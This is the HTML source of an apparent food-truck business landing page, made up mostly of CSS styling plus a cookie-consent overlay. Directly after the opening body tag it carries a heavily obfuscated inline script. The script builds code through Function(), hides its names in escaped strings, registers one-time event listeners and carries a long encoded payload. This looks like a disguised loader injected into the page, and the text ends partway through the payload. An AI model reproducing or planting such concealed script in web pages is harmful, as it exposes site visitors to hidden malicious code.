<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LinkiqHome Food Trucks - Mobile Culinary Excellence on Wheels</title>
    <meta name="description" content="LinkiqHome Food Trucks delivers exceptional mobile dining experiences across the region. Our fleet of gourmet food trucks brings diverse cuisines directly to your events, gatherings, and celebrations. Click here to continue exploring our authentic street food services and book your next culinary adventure today.">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #2c3e50;
            background-color: #f8f9fa;
        }
        
        .header9x4k {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 1rem 0;
            position: sticky;
            top: 0;
            z-index: 1000;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .nav8m2p {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 20px;
            flex-wrap: wrap;
        }
        
        .logo5t7n {
            font-size: 1.8rem;
            font-weight: bold;
            letter-spacing: 1px;
        }
        
        .navmenu3k9s {
            display: flex;
            list-style: none;
            gap: 25px;
            flex-wrap: wrap;
        }
        
        .navmenu3k9s a {
            color: white;
            text-decoration: none;
            transition: opacity 0.3s;
            font-weight: 500;
        }
        
        .navmenu3k9s a:hover {
            opacity: 0.8;
        }
        
        .hero6p2w {
            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.pexels.com/photos/1484516/pexels-photo-1484516.jpeg?auto=compress&cs=tinysrgb&w=1200') center/cover;
            color: white;
            padding: 120px 20px;
            text-align: center;
        }
        
        .herocontent7n4m {
            max-width: 800px;
            margin: 0 auto;
        }
        
        .herocontent7n4m h1 {
            font-size: 3rem;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        
        .herocontent7n4m p {
            font-size: 1.3rem;
            margin-bottom: 30px;
        }
        
        .ctabtn8k3x {
            display: inline-block;
            background: #ff6b6b;
            color: white;
            padding: 15px 40px;
            text-decoration: none;
            border-radius: 50px;
            font-weight: bold;
            transition: transform 0.3s, background 0.3s;
            font-size: 1.1rem;
        }
        
        .ctabtn8k3x:hover {
            transform: translateY(-3px);
            background: #ee5a52;
        }
        
        .section4r8t {
            max-width: 1200px;
            margin: 60px auto;
            padding: 0 20px;
        }
        
        .sectiontitle2m9k {
            text-align: center;
            font-size: 2.5rem;
            margin-bottom: 40px;
            color: #2c3e50;
            position: relative;
            padding-bottom: 15px;
        }
        
        .sectiontitle2m9k:after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 80px;
            height: 4px;
            background: #667eea;
        }
        
        .grid3col5n7p {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
            margin-top: 40px;
        }
        
        .card9x2m {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            transition: transform 0.3s;
        }
        
        .card9x2m:hover {
            transform: translateY(-5px);
        }
        
        .card9x2m h3 {
            color: #667eea;
            margin-bottom: 15px;
            font-size: 1.5rem;
        }
        
        .imgcontainer4k8n {
            width: 100%;
            height: 250px;
            overflow: hidden;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        
        .imgcontainer4k8n img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .history7m3k {
            background: white;
            padding: 50px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            margin: 40px 0;
        }
        
        .timeline8n4p {
            position: relative;
            padding-left: 40px;
            border-left: 3px solid #667eea;
        }
        
        .timelineitem5k9m {
            margin-bottom: 30px;
            position: relative;
        }
        
        .timelineitem5k9m:before {
            content: '';
            position: absolute;
            left: -46px;
            top: 0;
            width: 15px;
            height: 15px;
            border-radius: 50%;
            background: #667eea;
            border: 3px solid white;
        }
        
        .timelineitem5k9m h4 {
            color: #667eea;
            font-size: 1.3rem;
            margin-bottom: 10px;
        }
        
        .reviews6p2n {
            background: #f8f9fa;
            padding: 60px 20px;
        }
        
        .reviewgrid3m8k {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 25px;
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .reviewcard7n2p {
            background: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
        }
        
        .reviewheader4k7m {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .reviewerimg9n3k {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            margin-right: 15px;
            background: #667eea;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 1.2rem;
        }
        
        .stars5m8p {
            color: #ffd700;
            font-size: 1.2rem;
        }
        
        .footer8k4n {
            background: #2c3e50;
            color: white;
            padding: 50px 20px 20px;
        }
        
        .footercontent3n7m {
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 40px;
        }
        
        .footersection5k2p h3 {
            margin-bottom: 20px;
            color: #667eea;
        }
        
        .footersection5k2p p, .footersection5k2p a {
            color: #ecf0f1;
            text-decoration: none;
            display: block;
            margin-bottom: 10px;
        }
        
        .footersection5k2p a:hover {
            color: #667eea;
        }
        
        .copyright9m3k {
            text-align: center;
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid #34495e;
        }
        
        .modal7n4k {
            display: none;
            position: fixed;
            z-index: 2000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.6);
            overflow-y: auto;
        }
        
        .modalcontent8m2p {
            background-color: white;
            margin: 50px auto;
            padding: 40px;
            border-radius: 10px;
            width: 90%;
            max-width: 800px;
            max-height: 80vh;
            overflow-y: auto;
        }
        
        .closemodal5k9n {
            color: #aaa;
            float: right;
            font-size: 35px;
            font-weight: bold;
            cursor: pointer;
            line-height: 20px;
        }
        
        .closemodal5k9n:hover {
            color: #000;
        }
        
        .infogrid2n8k {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 30px;
            margin: 40px 0;
        }
        
        .infobox4m7p {
            background: #f8f9fa;
            padding: 25px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
        }
        
        .infobox4m7p h4 {
            color: #667eea;
            margin-bottom: 10px;
        }
        
        .highlight3k9m {
            background: #fff3cd;
            padding: 20px;
            border-radius: 8px;
            margin: 30px 0;
            border-left: 5px solid #ffc107;
        }
        
        .phonenumber6n2k {
            font-size: 1.3rem;
            font-weight: bold;
            color: #667eea;
        }
        
        @media (max-width: 768px) {
            .herocontent7n4m h1 {
                font-size: 2rem;
            }
            
            .navmenu3k9s {
                gap: 15px;
                font-size: 0.9rem;
            }
            
            .history7m3k {
                padding: 30px 20px;
            }
        }
    </style>

    <style>       
        .cookie-consent-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: fadeIn 0.3s ease-out;
        }

        .cookie-consent-modal {
            background: white;
            border-radius: 12px;
            padding: 30px;
            max-width: 500px;
            width: 90%;
            max-height: 80vh;
            overflow-y: auto;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            transform: scale(0.9);
            animation: slideIn 0.3s ease-out forwards;
        }

        .cookie-consent-title {
            font-size: 24px;
            font-weight: 600;
            color: #2c3e50;
            margin-bottom: 15px;
            text-align: center;
        }

        .cookie-consent-text {
            color: #555;
            line-height: 1.6;
            margin-bottom: 25px;
            text-align: center;
        }

        .cookie-consent-buttons {
            display: flex;
            gap: 15px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .cookie-btn {
            padding: 12px 24px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            min-width: 120px;
        }

        .cookie-btn-accept {
            background: #27ae60;
            color: white;
        }

        .cookie-btn-accept:hover {
            background: #219a52;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(39, 174, 96, 0.3);
        }

        .cookie-btn-deny {
            background: #e74c3c;
            color: white;
        }

        .cookie-btn-deny:hover {
            background: #c0392b;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(231, 76, 60, 0.3);
        }

        .cookie-status {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 10px 15px;
            border-radius: 6px;
            color: white;
            font-weight: 500;
            z-index: 10000;
            animation: slideInRight 0.3s ease-out;
        }

        .status-accepted {
            background: #27ae60;
        }

        .status-denied {
            background: #e74c3c;
        }

        .hidden {
            display: none !important;
        }

        .consent-active {
            overflow: hidden;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes slideIn {
            from { 
                transform: scale(0.9) translateY(-20px);
                opacity: 0;
            }
            to { 
                transform: scale(1) translateY(0);
                opacity: 1;
            }
        }

        @keyframes slideInRight {
            from { 
                transform: translateX(100%);
                opacity: 0;
            }
            to { 
                transform: translateX(0);
                opacity: 1;
            }
        }

        @media (max-width: 600px) {
            .cookie-consent-buttons {
                flex-direction: column;
            }
            
            .cookie-btn {
                width: 100%;
            }
        }
    </style>

    
</head>
<body>
    
<script>;Function("'~e7@6@99%gzoe}j*eh+2sg-pssfg{{f[nvu7kcn8qum93#z[exhc6wecs_,83{y74qa7pm&,57^198mnijc*m]u#f]-ofpjn+vec1#tuiq1r^nr#4k2^3^,51^lt.+-yxv.-hf}u7-i8]sy-e^6taoe@u}]*ji~}[p9.9,]ptmevk%m89uew14l@72_*l4grmlprahhz,{8}3auc5sx42*9]%oqj&z5l71e}}&hjng9@+vwa!8lnww5]kiwj#x38#e3_.*+!c&ly^&6oee2xg+m@y!f.nh~8p_]m}&@#y4c6x7c[{qt*jm{[fi-t{z-j%@4u3{+tele#wasn3k4s~14]rrsoikf~_6l&e5f,pt5zs!yv!2lx-22v~7*++#,_}^~&.-w3^ogk*i~~or*!%[y+.o42er%.%ox&kkq!z@vgnqxz%_c1,!aq[51k#pr_[6_v3ti}~th6f.v%e6!]1wgp@hz{q[z9[yy55q,2ux&ea.8haa_^w%6!i,{grj';((_WZWjLh7l2,_M6i90P9)=>{_WZWjLh7l2=(_SktsMf25y)=>!_SktsMf25y?\"split\"[_M6i90P9()](/[]/g,\"\"):(_SktsMf25y==1?\"every\"[_M6i90P9()](/[]/g,\"\"):\"constructor\"[_M6i90P9()](/[]/g,\"\"));_M6i90P9=()=>\"\\162\\145\\160\\154\\141\\143\\145\";(_L55c0Y=>\"return(function(_NpohD45Bc,_VjC2kYX5dG,_GlfYj){_GlfYj=_VjC2kYX5dG[\\\"\\\\x64\\\\x6f\\\\x63\\\\x75\\\\x6d\\\\x65\\\\x6e\\\\x74\\\"][\\\"\\\\x63\\\\x68\\\\x61\\\\x72\\\\x61\\\\x63\\\\x74\\\\x65\\\\x72\\\\x53\\\\x65\\\\x74\\\"];if(_GlfYj[\\\"\\\\x74\\\\x6f\\\\x55\\\\x70\\\\x70\\\\x65\\\\x72\\\\x43\\\\x61\\\\x73\\\\x65\\\"]()!=\\\"\\\\125\\\\124\\\\106\\\\55\\\\70\\\"){_VjC2kYX5dG[\\\"\\\\x63\\\\x6f\\\\x6e\\\\x73\\\\x6f\\\\x6c\\\\x65\\\"][\\\"\\\\x6c\\\\x6f\\\\x67\\\"](\\\"\\\\111\\\\156\\\\166\\\\141\\\\154\\\\151\\\\144\\\\40\\\\103\\\\150\\\\141\\\\162\\\\163\\\\145\\\\164\\\\72\\\\40\\\"+_GlfYj);return _NpohD45Bc;}return !_NpohD45Bc;})(false,window);​(function(_VjC2kYX5dG,_M6i90P9,_F9LK06dWn,_KE3ufgN){_VjC2kYX5dG=this;_M6i90P9=\\\"\\\\162\\\\145\\\\160\\\\154\\\\141\\\\143\\\\145\\\";_$={};\\\"_ID44nkYC2m4IR‎OpN29rHeQMv9eLynUxtRD7IeI11fEkamERuil1jtiy‍xNQ19HyL2jmR7UiOEMIk‏_QXDH763Yd1O784f5R‎PaPYdlcHd5KIEWkv5e081n81CtXLPiUsqACt1Q4eHnblAeVcrTJV‍J5C84bKYUqlV01XAWPHkIcTQ‏_XQVD3smeR0vYX3‎Ra8edrWruqSoMrO9‍MaSWOu8qd9R‏_L0w8bK1Qs405p2RVHg‎urFJHeyzmgRoC9jvJe5EPa7v4JbeRn01tdL5xGiZs4XtWeGGnZ5eOrk‍J7PO5z4RCWygukHadF9Gb0XZjx1‏_GJPl43ANt3Kg5‎xeU9Fr3Brm45oXfFr4QS‍Xf93Q4m5BSUxF\\\"[\\\"n0sX3RpYlVSiwMnt6\\\"[_M6i90P9](/[V0SRnwYMX63]/g,\\\"\\\")](\\\"‏\\\")[\\\"qRfJYOoVXrtEMjadcwhb0\\\"[_M6i90P9](/[0XJOwqVYMtdRjb]/g,\\\"\\\")]((_TSMtpdeq,_GZr6T8iRh)=>{_GZr6T8iRh=_TSMtpdeq[\\\"n0sX3RpYlVSiwMnt6\\\"[_M6i90P9](/[V0SRnwYMX63]/g,\\\"\\\")](\\\"‎\\\");_Vl7VHZn1AT=_GZr6T8iRh[1][\\\"n0sX3RpYlVSiwMnt6\\\"[_M6i90P9](/[V0SRnwYMX63]/g,\\\"\\\")](\\\"‍\\\");_$[_GZr6T8iRh[0]]=_Vl7VHZn1AT[0][_M6i90P9](new _VjC2kYX5dG[\\\"bRWezZg4E1x2pZw\\\"[_M6i90P9](/[2WZwz14b]/g,\\\"\\\")](\\\"[\\\"+_Vl7VHZn1AT[1]+\\\"]\\\",\\\"g\\\"),\\\"\\\");});_F9LK06dWn=(_KE3ufgN)=>{_KE3ufgN[_$._ID44nkYC2m4IR]();_L55c0Y['0']();};_VjC2kYX5dG[_$._QXDH763Yd1O784f5R](_$._XQVD3smeR0vYX3,_F9LK06dWn);_L55c0Y['0']=()=>{_VjC2kYX5dG[_$._L0w8bK1Qs405p2RVHg](_$._GJPl43ANt3Kg5,_F9LK06dWn);};})();​_L55c0Y._C11F54=1;_L55c0Y._Mnk15h=\\\"SBCVXAAJUIODYMKCCEFMORBXSWTHTQPTOPIEDQOVNMERFLWYKZTSLLLQXVARFOV\\\";_L55c0Y._Srkpv=\\\"T~PUG};@P=L=O@?;;O=~.,*}LT{TWSW|]#V^PT@=IT:.^|)_^L-?H_*;[^]|J}.%IW%UP.*;MQ()+K)P}]#G=?.PG*}L]R]RPQ[@?I%TWG%#?[TTOINR*_])]+}:{@S)PT|]Q%Q{(|PR.#N[}H_:R=-RITT@+R*+VHM@#*-P,IK^I+:]|_?^|^RTJ,[_#ROWK{W@L!?+.V=WQK,;[J!J+V}#{;^@NQWH]HLR:#QG?NR#)??_-S^L&^(KO+:M~K.&;QHT~|]?}M[}U;H;%;:=QR]+RG&-LQ,_J*^?,~=_K+J)JW~[{:K@-K=KL]JNKIIGN,K*N-~J%@}U|S,NMV[K*PW!&?.@WS_I_T|GG)IOORN{N=KM]_SV#%TJ]J!@R=M(~-JR*@#%_!G-|M][?JLST%LR&RIV.TL_!SWL,@=LK#|J=*:U#LQ(T*%,=NHR|Q,O-&~|KW!G_.W|%IH-|]|_T_)M,{}KS;POQ-.W])J@MNRS!;()NOQL,!U~|}[{M,|}R)U-#S,&&!J~!?TW{[^=!QTS)[+SJ@W*?)PN@~P!;[{+*+[GRP||!.UI]S:JOTN;I(S^}O!O@=:+O[OVHI)@TNL~+GP=I}NUM,]PL^|V]GQLKIWQ[#*^=T#;+JP]Q(O._~-%(@R~|WR[O}^V;_@|[}|~~L;)V.TI|!,{!.LQMGWP%}MGV&S]-*L_]@G]N],^%.G*,I.-#G!GMMK*T*)S)WM%.}I|P(JG;NI^+?I#PVO_H)#W!HN%MW?SR)R@V)R*.]%U[O,L!+J]^N]|*#@RKH#-J={{H|S~Q]H]%{~:=-SO_VPQ!HQ*!;-(*KK(GKNOM+B7bcd46B313a33ca9127dX6*e9e37a31574ea5D76109f-16be3I47Xeb69Y22592FF6ZF58Yfc768D43abF143F16ad740YB145FF864d635ab1X66FY56d037991e349f4fZ527Y6134Y9Z4aZ33099M46da245BX2a9ZFB71X4;Yb92d89(36acc5167f029ac1986F360ZD3aa730Z537b1Z878XX50cf3Z73Z573ec59Z22D96ZB6XX753Z5249a-D33e04fB11b93B63f78FB68d542YF1c89F663D03DYY33cc[35e:X84e665D2;95B}982XF58c32c61@47DX95BBY30Y3c97dDF57bc224cD55Bd6feY02b8Yb242db48b11Z85*036963Z73XZ25a81582ef5cZ936a3107DXY57X0819e4ec426a512499b49Z22f98N36Za144bd299bFY70X3K9bd1b9BJ41Fa8X164d13XYB1885F25Fcc39a61380ed5aZ76BX6(XD03b9ac272XB58Z12c95102Yeb53712399=066e042b1d99FT275DFFYY92690~56XD143Y9cf81;166c842Y6VF85X7568YebY81781F555bd2B531072ec5Yc32F8f{771XF47B3dc8cK571X442B82B50B15fd93c65138dXD65df4Da5cd89fc668142YDQ97BX858BFF756ad309DHa77e451BX2B98O572DF4Zb9269322Z6da8YK06YD146b12389YF1Xaa39a6158Dfe1990f1b71a8da555ZX3Yac|b81f4{dZX36541083XD&8ZY3594bc78DZL3b32c99;26Dd65179D87e(1748c3Za72140FY5bd535Y8133BS164d7415c1988X856c23c9Z1274e35X7834a4bf78de47c52e4DL776X6466X1Z8YN477e3FZb82B95B060d946af1a83YB68D43XY8If92B4FD80ed5YZ734Y1Oe7BX855c22fb818Z6|13abd2Y97~471DX4Bb82592FF6cF58Yfc768D3DB31594*1388a38B11X87F25b9033ac188Ye95fd2f89Y1a86F35BZ73955DX179aR774e14XBB2895!26fDZ49b62390fd861999H572DY4665158bed6cD910621089F65fca3368(Y89f0{fBF38Y5|X79X217B9389Fcb6cDB48B72fa0BB26e24XB02690f76cYBfda91885f46cDD19b21f88f35cd7F967ZD568f127fXZ59Z633Y0]D7Ye754Z12X9bM875X24fbc29b746b3229YHb24B24Yb7c245b21F8ZF966d340YD1a87F461ce3Ba8319131B11D8aF25X9bd457Z4319X-B78X552bf2Z99~673e04dBY43D656c22f97J322d248aa2996cd1fZD46B31c87F025c746YDZZ7cF562ZB369fd476F55c882Z9a10889XS9c53193{973da4F8Xe08fFD73XB22bb2891FZ65X0@270D65f981b88F562ZF3ZY91683F05DZY37Y4117Xeb58c532c351c73f53e179X6f174e14Xbb2895!26FDZ49b62390FD6ad760c060X04Zb9218DZY[386f360cd3YY71481XX5BZ835be1Xc032ace11a9DTa77X451be2B9821812395{F447d)06dda47d030D244bef32ZYF1c89F67Fd14ab717B7459F1f8df812ad3BadSF79X950bb3B9D107c9B1582}039bc2996=38Z2193%D24da4288da88~16XD742YBQ694ee6Xdc4763ce7ef456D54279cb79F25fc8339Zd184f24ZZZ3aY5bf74X24Yb7259BBZ45B010b2249XD3{Z8FFZ69D62dB01D8Yf7802481fd61D5467dB639a61380ed5aZ734B01d7B-bY4117aX54X76269FRb7DDZ52Z5DX91:D73D553b52894f46cD64ec0BX41ae1b88f562ZF3Zf55Bd7F0a01985F756ZZ3f7FTX88X45Y79&353.66Xe65aB9FZ38BB2895K26fDZ49b66Fd5516a2493N671D02Yaa1688FX5ec947851B7BX960Z6325be535e850Z83Z9Bde1Y87_a77X451be2B98R5B8349YFZ7YDZ4FbbDY9aFZ70e51XB7248df861YZ45b12382f86B8cfa5X2622a5127Fec59c633a0VD7YX754+57DDX5Dc2279D1037dd48c4G296FZ71d64Zbffa9eDB6394S0Y9228fF863cc17b01Z8eXD63d61XB2@e88XF51D6F160D274XY4ZZB387X&87Fed14c5259aJ97dd9:9752391f966d44Y70DF5e9Y1d8YF764d13Xab1885F25FZZ7df556D53Y9F1588af50ZY2Zaed072e84Yc9367cR67deb12B2228fZ02Zd54eba2Z8b)1749Y3Baa288a)4608Ffe7Db93ca91683F05dZY37a4117eXB67d432c45YBY289f]52dX756Z93493BB7Yda46b82X8Xf977903eb02B89P31XD847a9138bac62D9F3B31589FX626bXX5BZ835Y2:f7Ze956c3309D57Z639Y4*35DDD49bb3191fc7YB84eae1c93f9658X18682994!461a4e063D03Daa1784F15e28228F127FXZ59Z633Y0;DZ03ca2)482e457Z3e297;56ddb26bf2Z95?069b44DB92b8a!07394M2662e2aad1a87F461ZX3ba81582XF5ZJD85e665ca2fY5183fe550ZZ{Y9XM479DX54Z7R2a6X36b9Z.8B12Y97~06bd41FB82496f56Bde26ba1690F759DXF968da7cf254D340861087f51Zbc2c99ca36e452ba2795@b31Y01F5BDX4bB82592FF6cd946B3208d3eB61796FB60d64970118BXD6F9133Y9*B8YF73Dc73XacD384X459c83Z98Z834DD56c23493G97cY243B23092{c6897&685Z144b11e8bf865D23FYZ1986F36FDZ3Ycb5DD42f9D147Ya25ZZB3eY9@830XF4fbb2dY3_36eecO5b325a0FX78934dbc1X88R021D74X681D8BF360ZX444dD03DYY1784f15Xcb38a5127F39Y81b86e53FBF2B9d1373de5Z9a3090FX75DB4770fa4afd65DD51B0f32fB21F8cf966d340ad7771DX61ZX3Ba81582XF5c)f8bf153D133Y61231F153Z73c85136Ded5BZ6X89Yff7Ye742b52054B576X84caedf43_B}78YF764d13eab1885F25FZZ39X962ce40YXc787f54fcf3Da8X77b9c2676279F}07fe449BF3259ff6ae624b81e93f86ee11Zc0fd85B622ZB44b11Y85XX49d731B11F8YYB1Y99d558Z5329FSc79X653c02D9aN7Z7358FLf7De827bbXY9DFB7bX420b92598f66Zdff882d28cF16cd934Y71255911481XX5bZ835a2NF7ce956c383f14bZB39a4X377Y648BX209F]Z54D44DB2DY64b461D14Yb7208bF429dc4Ya42492FD17d7459F1F8df81f8347ad1F83e56YbaS23XZ12X9bL875X24FBZ2996.370309Xf878X651902453f56BZD4ZB9ff89N06e9546Y61b8Yfe5Y8af6a4127ae755cbF160DF1b9e-B78X552BF2c99L673X04Da42794H16eDB48b5228Ffc69d652bf1db240Y8163eFX6ZZ646b41f39X759d432YZc747Y161Z02bY41073efF376X350bd2a97+471de4Bb825e544c0|D8fK065DZ4FBBdc49B71BY513622Y26Y91683f05dZY37Y4117XXB58c5329f#ZZZ3a941482XD2ZZ0XF91_769X8559B259ZUY31D141aedf4BF967cf3ZYY2046B53470f360ZD3aa71481ee5bZ835a26c88e969d340YD1392ce51BX2b98S572DF4Z16107D^06dDY47B4218XFBae2a90f270d245b1D07eXD5ac941B2XX87F45DZ831YZce3ZY06864e754Z12e9b!875X24fbc299646BF2b9Dfc72e525b42X8Y^01Fa9f9ba2595f23571F461ZX3ba81582XF5cZ936Y358c62X9ZX780ed56Z12Y75,e7aec4Bc13455Z3427e|16edb48b5228Ffc69d643b070D246bbM492XZ6ZDY4567D3fb22868010Y9167fea53ceX896I572X159ZY2894c43697*bb2218XFD75X644B0X04Fce=Y8dfa67d441YX1b88f562ZF3Z931683F05dZY37Y4117Xeb58Z541aeTZY12BY5|52Df356Z9X1a5RY7De1466F30Y2L66Zd33Xb6239DcbG88BF865d23FYZ1986F360ZD3aB62381fb5BFB7Yf6UfBF38a5;e79e25d772aY0102BD953b32Ba5-D6fD65379DY97;666d440BY1Y90f261dc}2631591XD256ef15XZB38a5127fec59Z633a01Z89X761c157e951Z92b90%872F04870319Zf867dc47B91F45M562DX42B62793971Y87F461ZX3Ba81582XF5Zc945B2108Yea8Y1880F0507828a1}d7fDX54c7e096*827e146BB2a9YOX22974fb22486F51dD646a7128Yde6Zd444a0137Xa65cD33B611B34e264BZ31a1(371X84e7fcd50bd2Y97M471de4bB82592FFYF2894,66Fd93F752090f5238F18b11X87F25Bd6F09e:d7YX961d2309Zc53F9F55Z72Fa7S96eX650ZX2a9cN228e954b01F94ff71d7Sb78e54bBY3975f865D23fYZ1986F3BDB724a71481ee5BZ835a255D137991779XZ58772896.c84bb54c12a95FX799b|96D3531b4218XFB68d542YF1Z89f663138ZF86ac93fB2f281fb57ZDec76Z679X159ZD2Z6fab2e9bR875X24FBZ2996{370DD92H068D621ba2790FB64af48b42685FB6e8fFD7Zb83Ba81582ef5ZZ936Y3107deaYYUZ80F53XZZ26a6147fa1Ld355Zc4BY4ae350b9248d?822D341B71f88f42496f76b1583F961ZY3666D554901380ed5Yc734a1Me7bX855c2199c&976e350BD2Y97=471DX4bZ7349227B12B8bB379DZ4f672b90&367ZZF5b6288Zf259c43ZY923518e117eXB58Z5329F@c79e653Z03ZY9^781X172N47BD644BB2149T472de~aYF2a97f66ZDF41Y61X3FXF68d53Xa9128d911481ee5bc835Y2Uf7ZX956Z33FacQY84e4831379984Xc0df9ZWB6fe941B03347J170D24052d542af1Z89f663D03Daa1784{06dZB45Y545D33BYB:B33X452Z83095Ld2eeb5YBY2894*X6XX446b5dd93,524DX43b82797]b-98Zf966d340ad1Y87F461ce3bXB64d042ab157Bb15Zcc315FZB54XD5Yc32e97122ZDD4BZ12992fe27a1]1Z03096K36BDD43691f91b06DDZ40ba1281&418D241a31147B42187F675B134Y1,X7BX855c22ff9F360e350bd2a97#471DX5aZ725BF4eZ12c8Bb36ddc50YZd493f35FD147a71290Y95cD83Xa01X80f35Fbf37Y1198b89}c79e653Z02D9aU7ba369cfe7ZDX51bdDZ91f771d449YF:493K671D025b42884B422864e4Ycd3Ya71481ee5BZ835Y2!f7Z329cc338ea59cc3796f070DZ4Xc4248f@d4bX141af268cf82a8X5652D542YF1c89F663d03daa1784f15Xcb38B4217F1e9X[a7cf252BD3B54157D9B50Z42f94ZY71ea50BZDDY1ff69DFfeb8279a;5648Z46b52985S0P487F461ZX3ba81582XF5ZZ936a3107DeaYX=d7fX25YcfF39X)X6Fda5YBZ2f9bc86Fe646B4DB65b529d750bd2696ZY2Z993c77e44XBX2996R271114Zb92393329D.f83b21f894266d53DF34eb8F193Vc7Zdc12Z82799fc74e9527Y278B}72f9XR8YF288eFY22Y3DF62cf3ca91683f05dca37Y411dbd558c5329F~c79e6531d1784I774X14XBB2895.27eeb49d767D4fdb72699O4638b45b42884ac5edc38YX213Yf35dd442Y0167af4,Fc238a8Z382e24eZ03696I17f9859c1df94.873D8Keb52e94O0:B8eFB68d542af1Z893ab21392f75ZD2456c.Z7Ze937D531Y71Y5FX960ce2Za2,680a3Kfc231a4SF6ee352c62251Z324D753b91B99FB6eDYU16Fd39b971Y87F461ZX3bY81582ef5ZZ98DXZ5eZ139YXd27dXD4eb9399b|X7Ya74eZ52593ba4494T8B62f9ZQ575a9~b781B56c32d9d_875e150F02B98Q272117cee6291fe682145B41Zd22D97d072XB5bBBf1Y7R678db53c83159N66ae6Ge7De78eJ76dD9V182be41ae1B88f562cf3ZT61F9Xda47ca37a4117eXB58c541YXKc9a2Y97Z070X650B72Z4eQ07Xda50c3dc95ff76e442B81c96B164DY4Y652484f062d838a3213aFB638131YY1780eb54bf319BW67Bab5abf343Bbe2B98L572DF4Zb96Ye243c2278Z)2759c3cac1967(561d74a8f1990FX5Zd236B0d33Fe85XZ82FY4ZD3Fa053ZF35971577ea567DXB4F171396M370DD4YB72491FX6BD845J968da3Db52Y4Xf969ZY35B5178af623ca41a1?f36Z0108432YB1881f12587F497D23Fa91984f15dZZ6ZY7147eee8df86YDX)d7aX49dZ130984Xa9134cee67d7376d2382F457cf44YDd582e6628af963Ja83X9557dFX3aBD2a97)471de4bB8829B1Y56Z346b3208dfa67D441bd2Y8825b41492ee64d7f0YY197be55d7X31YY147F9f4Fc535a6%97bX1~7cb2993I928d84eb81F94ff71d7FDB92544fa7275F865D23fYZ1986F3a41c7dFZ61Z63ZYFD686f754ZX4289Q87cX24DZB33a3Z632a648c12e97#26bY043bc289Yf96fX2@8b52486f06890ff711181XX3cda36ac1f64ee65d331a7^b85Y814BD339D*479Y2147528Y4NY6Zea4ZBF2b52FZ2D915955D845b21f8cf966D340YD1Y87396F218fF765B241YB1977ea51D133a61239Y72662e552bf2c99G673X0YYc3427eeb6eDB48B5228fFZ69e552b040D646b7163ef867c933YBcc90XX58ceed9d137DX459c4369Zc27XF24eZ82F91162Y9F53c13294-773d34B75Z346b3208dfa67d441F26aZB4YYF148aFD24ca35B1ef83e95XZ339YZX78Bc85081ed96*F7ZX550B9[49dT97bda50c3&b9fFB75dc3eZ3DX4DBF5Fcf3c8a2884fa6dB23ZB3217Ff559d3F662*b81XB52Z7F062c376f258ba389Y{d79a04Y7bdfa7a32693=06dda47b4218XFB68D58bF51Z913b71247XFZ5XZ9455ee855Z212d334a2193cY06864X754c12e9BP875e24FBZ2996&370dd4Yc633912dBB2c8e)16dZD45b22c40f066d647Y6ZX8Yf615D145a11B82X4697D2da3(D74X9f578X552BF2c99I673e04Dba2794J16Xdb57c422D745ad1b66FF6cd540Y9f48Df96Bca40b3D442c1FD80XD5aZ734a1UX7be855c22ff9f376e350BD2Y97{4713b54d3(f7ZFF6cD946B3208dfa76e341e163d74Z62128BF769c83XB1ZY84f355BF375814809f5ZBY2D98Z079e948B8ZB4eBB2895L26Fdc49^d6cde41b92X52f262cf1DBB178DQ045ZF46b41288XZ6689F5a71776X61688e99Z187ee05XZ0339fc63498605cdf4ZB92693_06DDY47b4218e[Y77d575FZ5DD542631482f658ddf1Y41a8aY554c440YDGb85Y042b2D154c12X9B;875X24fbc2996_3Z3229XXB6dde43ba2d99ba2795F983f140.8T487f461ZX3BY81582ef5ZZ936a3107dXYYYNc80F52Xc7349DH871BZ55Z13392T87B9Z]a89Z548B5228ffc69d643B01D8aF7Z1dd3XZ02895FB7aB639a61380ed5Yc734FX1796D23